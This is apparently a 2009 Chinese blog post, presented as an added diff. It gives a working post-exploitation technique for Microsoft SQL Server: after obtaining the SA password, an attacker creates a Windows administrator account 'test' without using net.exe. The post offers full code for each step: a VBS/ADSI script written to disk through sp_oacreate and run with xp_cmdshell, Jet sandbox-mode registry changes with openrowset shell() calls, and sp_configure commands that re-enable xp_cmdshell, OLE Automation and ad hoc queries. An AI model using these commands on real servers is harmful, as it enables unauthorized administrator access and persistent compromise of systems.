@@ -1,0 +1,57 @@
+不用NET USER 添加用户！ (2009-07-27 20:26:55)转载标签： 电脑沙盘 分类： 网络技术  
+ 在获得SA密码后，往往因为服务器管理者或”前人”将net.exe和net1.exe被限制使用，无法添加管理员账号。我们知道VBS在活动目录(ADSI)部分有一个winnt对象，用来管理本地资源，利用它可以不依靠CMD等命令就能添加一个管理员，具体代码如下：
+set wsnetwork=CreateObject("WSCRIPT.NETWORK")
+os="WinNT://"&wsnetwork.ComputerName
+Set ob=GetObject(os) '得到adsi接口,绑定
+Set oe=GetObject(os&"/Administrators,group") '属性,admin组
+Set od=ob.Create("user","test") '建立用户
+od.SetPassword "1234" '设置密码
+od.SetInfo '保存
+Set of=GetObject(os&"/test",user) '得到用户
+oe.add os&"/test"
+将上面的代码保存为1.vbs，然后执行，命令为“cscript 1.vbs”，这样就会在系统添加一个系统名为test，密码为1234的用户。具体在查询分析器执行的代码如下：
+declare @o int, @f int, @t int, @ret int
+exec sp_oacreate 'scripting.filesystemobject', @o out
+exec sp_oamethod @o, 'createtextfile', @f out, 'c:\1.vbs', 1
+exec @ret = sp_oamethod @f, 'writeline', NULL,'set wsnetwork=CreateObject
+("WSCRIPT.NETWORK")'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'os="WinNT://"&wsnetwork.
+ComputerName'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'Set ob=GetObject(os)'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'Set oe=GetObject
+(os&"/Administrators,group")'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'Set od=ob.Create
+("user","test")'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetPassword "1234"'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetInfo '
+exec @ret = sp_oamethod @f, 'writeline', NULL,'Set of=GetObject
+(os&"/test",user) '
+exec @ret = sp_oamethod @f, 'writeline', NULL,'oe.add os&"/test"'
+ 执行完上面的语句，再执行下面这行代码，这行代码一定单独执行，不要与上面的放在一起执行，否则会提示“c:\1.vbs正被另一个程序运行”而无法成功添加用户：
+exec master..xp_cmdshell 'cscript c:\1.vbs'
+如果系统用户没有添加成功，有可能是因为系统用户的密码1234的太简单，不符合服务器的复杂密码策略，可以考虑设置的复杂些，然后再测试一下。也可以使用echo将代码写到1.vbs中，代码格式为：
+exec master..xp_cmdshell 'echo set wsnetwork=CreateObject("WSCRIPT.NETWORK")
+>>1.vbs'
+不过，不知道为什么所有带“&”字符的命令行都无法写入1.vbs，感兴趣的朋友可以尝试解决一下。
+使用jet沙盘模式，可以解决XP_cmdshell等存储过程和相关动态链接库带来的烦恼。出于安全原因，系统默认情况下沙盘模式未开启，这就需要xp_regwrite开启沙盘模式：
+Exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0
+\Engines','SandBoxMode','REG_DWORD',1
+然后执行沙盘命令，在系统添加一个用户名为test，密码为1234的用户：
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows
+\system32\ias\ias.mdb','select shell("cmd.exe /c net user test 1234 /add")')
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows
+\system32\ias\ias.mdb','select shell("cmd.exe /c net localgroup
+administrators test /add")')
+不同的操作系统，路径也不一样，需要根据情况做修改：
+NT/2K: c:\winnt\system32\
+XP/2003: c:\windows\system32\
+另外Microsoft SQL Server2005在默认情况下，一些存储过程是关闭着的，需要命令打开：
+开启XP_cmdshell：
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure
+'xp_cmdshell', 1;RECONFIGURE;
+开启'OPENROWSET'：
+exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure
+'Ad Hoc Distributed Queries',1;RECONFIGURE;
+开启'sp_oacreate':
+exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure
+'Ole Automation Procedures',1;RECONFIGURE 
